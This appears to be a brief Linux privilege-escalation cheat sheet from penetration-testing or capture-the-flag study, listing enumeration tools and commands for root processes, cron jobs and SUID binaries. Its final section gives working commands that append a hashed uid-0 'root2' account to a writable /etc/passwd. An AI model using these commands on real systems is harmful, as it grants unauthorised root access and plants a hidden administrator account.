# Enumerating Attack Vectors
## Helpful Tools
1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
2. https://github.com/rebootuser/LinEnum
3. https://github.com/DominicBreuker/pspy

## Processes and Jobs
- `ps aux | grep root`
- `./pspy64 -pf -i 1000`
- `ls -la /etc/cron.daily`

## SUID Binaries
- `find / -perm -4000 2>/dev/null`
- `find / -perm /4000 2>/dev/null`

## Writeable passwd file
- `ls -la /etc/passwd`
- `openssl passwd w00t`
- `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`